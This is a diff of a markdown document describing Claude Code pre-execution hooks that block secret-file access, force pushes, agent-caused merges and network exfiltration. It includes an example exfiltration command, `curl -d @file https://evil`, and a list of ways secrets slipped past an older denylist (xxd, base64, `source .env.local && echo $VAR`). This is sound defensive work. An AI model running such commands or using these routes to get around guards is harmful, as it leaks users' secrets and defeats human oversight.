@@ -2,7 +2,7 @@
 
 Project-scoped hooks configured in `.claude/settings.json`. They guard Claude's real-time tool calls before execution — unlike git pre-commit hooks, **the model cannot bypass them** (no `--no-verify` equivalent). This is why `settings.json` can ship `permissions.defaultMode: bypassPermissions`: the bypass is *earned* by these hard blocks running in every mode.
 
-Distilled from todoclaw's hook suite — in production 2026-06-23 → 2026-07-03; v2 hardening (prose-stripping, branch-scoped push guard) verified by an 18-case battery in todoclaw's post-launch retrospective PR, expanded here into the permanent `test_hooks.py`.
+Distilled from a production Claude Code hook suite — in production 2026-06-23 → 2026-07-03; v2 hardening (prose-stripping, branch-scoped push guard) verified by an 18-case battery in that build's post-launch retrospective, expanded here into the permanent `test_hooks.py`.
 
 > **Bootstrap order warning:** hook wiring hot-loads the instant `settings.json` is written, and a missing hook script **blocks every tool call** (fail-closed). Create the scripts in `.claude/hooks/` *first*, write `settings.json` *last*. A missing python3 *interpreter* is also fail-closed — the PreToolUse wiring wraps the command in `command -v python3 … || exit 2`, so a machine without python3 blocks everything instead of silently running unguarded.
 
@@ -12,7 +12,7 @@ Distilled from todoclaw's hook suite — in production 2026-06-23 → 2026-07-03
 
 Runs before every tool call. Exit 2 = block with reason **on stderr** — for a
 blocking exit 2 Claude Code relays *only* stderr to the model and ignores stdout, so
-a reason printed to stdout is silently lost (todoclaw's PR #309 lesson; the battery
+a reason printed to stdout is silently lost (a production lesson; the battery
 asserts the stream). Exit 0 = allow. An *internal* hook error **fails closed**: a
 crash would otherwise exit 1, which Claude Code treats as a non-blocking error — the
 tool would run — so the guards run inside a boundary that converts any uncaught
@@ -53,8 +53,8 @@ widens anything).
 | Bare `--force`/`-f` push (any branch) | Bash | Can clobber unseen remote commits; `--force-with-lease` is allowed on feature branches |
 | `git commit`/`git push` on a branch whose PR is **MERGED** | Bash | Pushes there are silently stranded (GitHub stops syncing the head + running CI); fails open if `gh`/network can't verify |
 | `gh pr merge` in any form except `--disable-auto` | Bash | **Merging is the human's action only** — Claude opens PRs and stops; `--auto` still means the agent caused the merge |
-| Any Bash command **naming** a secret file — `.env*` (non-example), `*.pem`, `*.key`, `id_rsa`, `credentials` | Bash | Secrets entering Claude's context. A **path-target** match, not a reader-verb list: the old `cat/less/head/…` denylist let `xxd`, `od`, `strings`, `grep`, `base64`, `source .env.local && echo $VAR`, and `node -e 'readFileSync(".env.local")'` sail through (todoclaw GAP 2). Fires wherever the path appears on the line; word-boundary lookarounds keep `process.env` / `obj.key` property access and `.env.example` from false-positives |
-| **Egress/exfiltration shapes** — a network tool (`curl`/`wget`/`scp`/`sftp`/`nc`) targeting a **non-allowlisted host** *while* uploading (`-d`/`--data*`/`-F`/`-T`/`-X POST\|PUT\|PATCH`), sending an `@file` payload, splicing `$VAR` into the URL, or any `scp`/`nc` push | Bash | Under `bypassPermissions` an outbound `curl -d @file https://evil` runs unprompted (todoclaw GAP 3). Allowlist is a **domain-boundary suffix** match (`evil-github.com` and `github.com.evil.tld` do *not* pass): localhost, `github.com`, `githubusercontent.com`, `anthropic.com`, `npmjs.org` + a fenced stack-specific slot (todoclaw adds its `supabase.co`/`supabase.com`). Plain GETs/downloads stay allowed |
+| Any Bash command **naming** a secret file — `.env*` (non-example), `*.pem`, `*.key`, `id_rsa`, `credentials` | Bash | Secrets entering Claude's context. A **path-target** match, not a reader-verb list: the old `cat/less/head/…` denylist let `xxd`, `od`, `strings`, `grep`, `base64`, `source .env.local && echo $VAR`, and `node -e 'readFileSync(".env.local")'` sail through. Fires wherever the path appears on the line; word-boundary lookarounds keep `process.env` / `obj.key` property access and `.env.example` from false-positives |
+| **Egress/exfiltration shapes** — a network tool (`curl`/`wget`/`scp`/`sftp`/`nc`) targeting a **non-allowlisted host** *while* uploading (`-d`/`--data*`/`-F`/`-T`/`-X POST\|PUT\|PATCH`), sending an `@file` payload, splicing `$VAR` into the URL, or any `scp`/`nc` push | Bash | Under `bypassPermissions` an outbound `curl -d @file https://evil` runs unprompted. Allowlist is a **domain-boundary suffix** match (`evil-github.com` and `github.com.evil.tld` do *not* pass): localhost, `github.com`, `githubusercontent.com`, `anthropic.com`, `npmjs.org` + a fenced stack-specific slot (empty as shipped — the worked example in the hook is a managed-backend host pair, commented out). Plain GETs/downloads stay allowed |
 | Reading `.env*` (non-example), `*.pem`, `*.key`, `id_rsa`, `credentials` | Read | Same |
 | Writing to `.env*` (non-example), `id_rsa`, `credentials` | Edit/Write | Only `.env.example` is committed; key/credential files are human-managed |
 | Embedding secret values | Edit/Write | Regex patterns for Anthropic keys, DB URLs with passwords, private key blocks, AWS keys, GitHub tokens, raw JWTs |
@@ -92,7 +92,7 @@ base), not local `main` — in PR flow you branch off `origin/main` and rarely u
 local `main`, so it lags; comparing against it would false-nag a zero-commit branch
 (2026-07-04 fix). Dedups per (branch, reason, HEAD sha) in `.claude/.stop-pr-nag/`
 (gitignored) so explaining instead of acting can't trap the session in a loop; fails
-open when `git`/`gh`/network is unavailable. Ported from todoclaw PRs #59 + #77
+open when `git`/`gh`/network is unavailable. Ported from the production build
 (2026-07-03).
 
 ---
@@ -134,7 +134,7 @@ sync.**
 
 ## Defense in depth
 
-(`.secretlintrc.json` — layer 2's config — is copied byte-for-byte from todoclaw's, in
+(`.secretlintrc.json` — layer 2's config — is copied byte-for-byte from a build in
 production 2026-06-23 → 2026-07-03; strict JSON can't carry its own provenance header,
 so it lives here.)
 
